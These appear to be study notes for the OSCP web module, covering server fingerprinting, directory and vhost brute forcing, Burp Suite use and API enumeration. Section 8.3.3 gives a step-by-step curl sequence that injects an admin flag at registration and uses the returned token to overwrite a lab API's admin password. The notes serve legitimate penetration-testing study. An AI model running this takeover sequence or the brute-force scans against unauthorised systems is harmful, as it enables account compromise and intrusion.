# Web — Enumeration & Assessment

- Module: PEN-200 / Module 8 — Introduction to Web Application Attacks (OSCP), **§8.1–8.3 + 8.5** (XSS §8.4 lives in [attacks.md](attacks.md))
- URL: https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516
- Code/command blocks: ~20

> Terminal output is omitted; only commands & scripts are captured.
> Placeholders (BoxHelper.html): `{{TARGET_IP}}` target host, `{{URL}}` full base URL (e.g. `http://target/app`), `{{LHOST}}`/`{{LPORT}}` your Kali listener, `{{WORDLIST}}` a wordlist path.

> **⚡ Quick jump:** [8.2.1 Nmap fingerprint](#821-fingerprinting-web-servers-with-nmap) · [8.2.3 Gobuster](#823-directory-brute-force-with-gobuster) · [8.2.4 Burp](#824-security-testing-with-burp-suite) · [8.3.2 Headers & sitemaps](#832-inspecting-http-response-headers-and-sitemaps) · [8.3.3 API enumeration](#833-enumerating-and-abusing-apis) · [PortSwigger: content discovery](#portswigger--content-discovery--extra-tooling)

---

# 8.1 — Web Application Assessment Methodology

> Theory only. Three assessment types by information level: **white-box** (full source/infra/design access), **black-box** (zero-knowledge, heavy enumeration — the OSCP default), **grey-box** (limited info: creds, framework, scope). Attacks map to the **OWASP Top 10**. Enumerate the stack (OS, web server, DB, frontend/backend language) *before* attacking — many bugs are technology-agnostic but payloads are not.

---

# 8.2 — Web Application Assessment Tools

## 8.2.1 Fingerprinting Web Servers with Nmap

> Start at the web server (the common denominator). Service/version scan, then the `http-enum` NSE script to fingerprint common paths (admin folders, listable dirs).

```bash
sudo nmap -p80 -sV {{TARGET_IP}}                       # web server banner/version
sudo nmap -p80 --script=http-enum {{TARGET_IP}}        # NSE: enumerate common paths
```

## 8.2.2 Technology Stack Identification with Wappalyzer

> Passive tech-stack lookup (OS, UI framework, web server, JS libraries — old JS libs often carry known CVEs). Wappalyzer is an online service / browser extension. On the exam, prefer the **CLI equivalents** below (no online lookup of the internal target).

```bash
whatweb {{URL}}                                        # local CLI stack fingerprint
whatweb -a 3 {{URL}}                                   # aggression level 3 (more requests)
```

## 8.2.3 Directory Brute Force with Gobuster

> Map publicly reachable files/dirs by brute-forcing paths from a wordlist. `dir` mode, `-u` target, `-w` wordlist, `-t` threads (lower = quieter), `-x` extensions. Noisy — not for stealth engagements.

```bash
gobuster dir -u {{TARGET_IP}} -w /usr/share/wordlists/dirb/common.txt -t 5
gobuster dir -u {{URL}} -w {{WORDLIST}} -x php,txt,html -t 10 -o gobuster.txt
```

> Status-code cheat: **301/302** = redirect (often a dir), **403** = exists but forbidden, **200** = accessible. Investigate the 200/301/403s.

## 8.2.4 Security Testing with Burp Suite

> GUI proxy platform. Community Edition = manual tools (Proxy, Repeater, Intruder — rate-limited). Launch, use a Temporary project + Burp defaults. Proxy listens on **127.0.0.1:8080**; point Firefox there (`about:preferences` → Network Settings → Manual proxy, all protocols). Disable **Intercept** for normal browsing; requests appear under **Proxy > HTTP history**.

```bash
burpsuite                                              # launch from a terminal
```

Add the vhost to `/etc/hosts` so tools/links resolve the app hostname (bypasses DNS):

```bash
echo "{{TARGET_IP}} offsecwp" | sudo tee -a /etc/hosts
```

Firefox: silence captive-portal noise in the proxy history — `about:config` → set `network.captive-portal-service.enabled` = `false`.

> **Workflow:** right-click a request in HTTP history → **Send to Repeater** (craft/replay/modify single requests) or **Send to Intruder** (automate: mark a payload position with **Add**, load a wordlist under **Payloads**, **Start attack**, watch for anomalous **Status**/**Length**). Intruder is the tool for brute forcing a bounded keyspace (e.g. a 4-digit SMS 2FA code).

Grab the first N rockyou entries for a quick Intruder simple-list:

```bash
head /usr/share/wordlists/rockyou.txt                  # (gunzip rockyou.txt.gz first if needed)
```

---

# 8.3 — Web Application Enumeration

## 8.3.1 Debugging Page Content

> Read the client before attacking the server. URL file extensions (`.php`, `.jsp`, `.do`) hint at the language (though routes often hide them). Firefox **Debugger** shows JS sources/frameworks/hidden fields/comments — use the **Pretty print** `{ }` button on minified code. **Inspector** finds hidden form fields. Pull raw source with curl instead of trusting the rendered page:

```bash
curl -s {{URL}} | less                                 # raw HTML source
curl -s {{URL}} | grep -iE "hidden|password|api|token|comment|<!--"
```

## 8.3.2 Inspecting HTTP Response Headers and Sitemaps

> Response headers leak stack info: `Server` (web server + often version), and non-standard headers like `X-Powered-By`, `X-Aspnet-Version`, `x-amz-cf-id` (→ AWS CloudFront). Use Burp, the Firefox **Network** tool, or curl.

```bash
curl -I {{URL}}                                        # headers only
curl -s -D - {{URL}} -o /dev/null                      # dump headers, discard body
```

Sitemaps / crawler directives often point at sensitive or admin paths (the `Disallow` entries are the interesting ones):

```bash
curl -s {{URL}}/robots.txt
curl -s {{URL}}/sitemap.xml
```

## 8.3.3 Enumerating and Abusing APIs

> Black-box internal apps ship custom (often REST) APIs. Brute-force endpoints, then probe each with different HTTP verbs — a **405 Method Not Allowed** means the path exists but your verb is wrong (try POST/PUT/PATCH). Version numbers usually follow the name: `/api_name/v1`.

Gobuster **pattern** mode to append version suffixes to each wordlist entry:

```bash
# pattern file:
printf '{GOBUSTER}/v1\n{GOBUSTER}/v2\n' > pattern
gobuster dir -u http://{{TARGET_IP}}:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://{{TARGET_IP}}:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

Probe endpoints with curl (`-i` show response headers, `-X` set method, `-d` JSON body, `-H` content type):

```bash
curl -i http://{{TARGET_IP}}:5002/users/v1                      # GET (default) — enumerate users
curl -i http://{{TARGET_IP}}:5002/users/v1/admin/password       # 405 => path exists, wrong verb

# login probe (confirms param shape)
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' \
  http://{{TARGET_IP}}:5002/users/v1/login

# logic flaw: register a new user WITH an admin flag the API shouldn't honor
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' http://{{TARGET_IP}}:5002/users/v1/register

# log in -> grab the JWT auth_token
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' \
  http://{{TARGET_IP}}:5002/users/v1/login

# reuse the token; PUT (not POST) to overwrite the admin password
curl -X 'PUT' 'http://{{TARGET_IP}}:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_FROM_ABOVE>' \
  -d '{"password": "pwned"}'
```

> Send any curl request through Burp for later replay by appending `--proxy 127.0.0.1:8080`. Burp's **Target > Site map** then organises every tested endpoint.

---

# PortSwigger — Content Discovery & Extra Tooling

> Supplements from the PortSwigger Web Security Academy not spelled out in the OSCP notes. https://portswigger.net/web-security

**Faster / alternative content discovery** (same idea as gobuster, different engines):

```bash
feroxbuster -u {{URL}} -w {{WORDLIST}} -x php,txt,html         # recursive by default
ffuf -w {{WORDLIST}} -u {{URL}}/FUZZ -e .php,.txt -mc 200,301,302,403
ffuf -w {{WORDLIST}} -u {{URL}}/FUZZ -fc 404                    # filter out 404s
```

**Virtual-host / subdomain discovery** (one IP, many apps — the `Host` header selects the app):

```bash
gobuster vhost -u {{URL}} -w {{WORDLIST}} --append-domain
ffuf -w {{WORDLIST}} -u {{URL}} -H "Host: FUZZ.target.com" -fs <baseline-size>
```

**Parameter discovery** (find hidden GET/POST params — a common source of traversal/injection):

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "{{URL}}/page?FUZZ=test" -fs <baseline-size>
```

> **Map before you attack (PortSwigger methodology):** identify the tech stack, spider the app, review every parameter/input, and note anything that reflects your input or references a file — these feed the [directory-traversal / LFI / upload / command-injection](directories-and-files.md) and [SQLi / XSS](attacks.md) attacks. Wordlists: SecLists (`/usr/share/seclists/`), especially `Discovery/Web-Content/`.

---

# 8.5 — Wrapping Up

> This module builds the map: fingerprint the server (Nmap/whatweb), brute-force paths (Gobuster/ffuf), proxy everything through Burp, read headers/source/sitemaps, and enumerate + abuse custom APIs. Every discovered technology + version is a lead into the exploitation modules. XSS (§8.4) is documented with the other injection attacks in [attacks.md](attacks.md).
